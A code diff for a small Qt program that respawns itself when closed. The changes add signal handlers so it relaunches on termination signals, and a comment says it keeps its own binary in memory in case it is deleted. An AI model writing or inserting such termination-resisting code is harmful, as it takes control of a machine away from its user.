@@ -31,7 +31,7 @@
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
 
-//char exe_name;
+char *exe_name;
 
 // Since we may launch multiple times a second, we need something just a bit
 // more random than std::time()
@@ -60,7 +60,8 @@ static void button_response() {
   QApplication::quit();
 }
 
-void die_and_spawn(char* exe_name) {
+
+void die_and_spawn() {
 
 #ifdef __unix__
   char *args[] = {exe_name, NULL};
@@ -74,9 +75,32 @@ void die_and_spawn(char* exe_name) {
   return;
 }
 
+void die_wrapper(int i) {
+  die_and_spawn();
+}
+
+void trap_setup() {
+
+#ifdef __unix__
+  signal(SIGTERM, die_wrapper);
+  signal(SIGINT, die_wrapper);
+  signal(SIGQUIT, die_wrapper);
+  signal(SIGKILL, die_wrapper);
+  signal(SIGHUP, die_wrapper);
+#endif
+
+#ifdef WIN32
+  //TODO
+#endif
+  return;
+
+}
+
 int main(int argc, char* argv[])  {
 
-  //signal();
+  exe_name = argv[0];
+
+  trap_setup();
 
   // Read in the executable file, in case they try to delete it
   std::ifstream exe_stream(argv[0], std::ifstream::binary);
@@ -141,7 +165,7 @@ int main(int argc, char* argv[])  {
   app.exec();
 
   // Evil
-  die_and_spawn(argv[0]);
+  die_and_spawn();
 
   return 0;
 }
